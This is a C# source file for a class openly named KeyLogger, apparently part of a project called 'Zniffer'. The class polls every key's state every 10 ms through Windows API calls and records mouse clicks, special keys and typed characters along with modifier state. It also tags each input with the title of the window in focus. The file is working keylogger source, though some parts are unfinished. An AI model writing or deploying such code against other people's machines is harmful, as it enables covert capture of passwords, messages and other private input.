using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;


namespace Zniffer {
    class KeyLogger {
        //event raised when key is pressed
        public delegate void keyCaptured(string s);
        public event keyCaptured RaiseKeyCapturedEvent;

        private string keyBuffer;
        private System.Timers.Timer timerKeyMine;
        private string handleCurrentWindow;
        private string handlePrevWindow;

        static bool shift = false;
        static bool control = false;
        static bool alt = false;

        static string registryKey = "Zniffer";

       
        public KeyLogger() {
            keyBuffer = string.Empty;

            timerKeyMine = new System.Timers.Timer();
            timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(getPressedKeys);
            timerKeyMine.Interval = 10;
            timerKeyMine.Enabled = true;
        }

        public static string GetForegroundApplication() {
            IntPtr handle = GetForegroundWindow();
            StringBuilder title = new StringBuilder(1024);
            int len = GetWindowText(handle, title, title.Capacity);
            if ((len <= 0) || (len > title.Length))
                return "unknown";
            return title.ToString();
        }

        public void getPressedKeys(object sender, System.Timers.ElapsedEventArgs easd) {
            handleCurrentWindow = GetForegroundApplication();

            if (handleCurrentWindow != handlePrevWindow) {//focuse changed
                RaiseKeyCapturedEvent("[" + handleCurrentWindow + "]");
                if (keyBuffer.Length > 0)
                    RaiseKeyCapturedEvent(keyBuffer);
                handlePrevWindow = handleCurrentWindow;
            }

            foreach (System.Int32 i in Enum.GetValues(typeof(Keys))) {
                if (GetAsyncKeyState(i) == -32767) {
                    KeysConverter kc = new KeysConverter();
                    string keyChar = kc.ConvertToString(i);

                    bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                    bool NumLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;

                    if (ControlKeyActive) {
                        control = true;
                    }
                    if (AltKeyActive) {
                        alt = true;
                    }

                    if ((CapsLock || ShiftKeyActive) && !(CapsLock && ShiftKeyActive))
                        shift = true;

                    if (Enum.GetName(typeof(Keys), i) == "LButton")
                        keyBuffer += "<LMouse>";
                    else if (Enum.GetName(typeof(Keys), i) == "RButton")
                        keyBuffer += "<RMouse>";
                    else if (Enum.GetName(typeof(Keys), i) == "Back")
                        keyBuffer += "<Backspace>";
                    else if (Enum.GetName(typeof(Keys), i) == "Space")
                        keyBuffer += " ";
                    else if (Enum.GetName(typeof(Keys), i) == "Return")
                        keyBuffer += "<Enter>";
                    else if (Enum.GetName(typeof(Keys), i) == "ControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "ShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "Delete")
                        keyBuffer += "<Del>";
                    else if (Enum.GetName(typeof(Keys), i) == "Insert")
                        keyBuffer += "<Ins>";
                    else if (Enum.GetName(typeof(Keys), i) == "Home")
                        keyBuffer += "<Home>";
                    else if (Enum.GetName(typeof(Keys), i) == "End")
                        keyBuffer += "<End>";
                    else if (Enum.GetName(typeof(Keys), i) == "Tab")
                        keyBuffer += "<Tab>";
                    else if (Enum.GetName(typeof(Keys), i) == "Prior")
                        keyBuffer += "<Page Up>";
                    else if (Enum.GetName(typeof(Keys), i) == "PageDown")
                        keyBuffer += "<Page Down>";
                    else if (Enum.GetName(typeof(Keys), i) == "LWin")
                        keyBuffer += "<LWin>";
                    else if (Enum.GetName(typeof(Keys), i) == "RWin")
                        keyBuffer += "<RWin>";
                    else if (Enum.GetName(typeof(Keys), i) == "CapsLock")
                        keyBuffer += "<CapsLock>";
                    else if (Enum.GetName(typeof(Keys), i) == "Apps")
                        keyBuffer += "<Apps>";
                    else if (Enum.GetName(typeof(Keys), i) == "PrintScreen")
                        keyBuffer += "<PrintScreen>";
                    else if (Enum.GetName(typeof(Keys), i) == "NumLock")
                        keyBuffer += "<NumLock>";
                    else if (Enum.GetName(typeof(Keys), i) == "Scroll")
                        keyBuffer += "<Scroll>";
                    else if (Enum.GetName(typeof(Keys), i) == "Escape")
                        keyBuffer += "<Escape>";
                    else {
                        if (!shift) { 
                            keyChar = keyChar.ToLower();

                        }
                        else {
                            keyChar = keyChar.ToUpper();
                            //oemminus//oemplus//oemminus//oemplus//divide//multiply//subtract//add

                            if (i >= 48 && i <= 57) {//numbers

                            }


                            //RaiseKeyCapturedEvent("" + i);
                        }
                        RaiseKeyCapturedEvent("ctrl=" + control + " alt=" + alt + " " + keyChar);
                    }

                    control = shift = alt = false;
                }

            }
        }

        #region ToggleKeys
        public static bool ControlKeyActive {// ControlKey
            get { return Convert.ToBoolean(GetAsyncKeyState((int)Keys.ControlKey) & 0x8000); }
        }
        public static bool ShiftKeyActive {// ShiftKey
            get { return Convert.ToBoolean(GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000); }
        }
        public static bool AltKeyActive {// AltKey
            get { return Convert.ToBoolean(GetAsyncKeyState((int)Keys.Menu) & 0x8000); }
        }
        #endregion

        #region DllImports
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        #endregion
    }
}
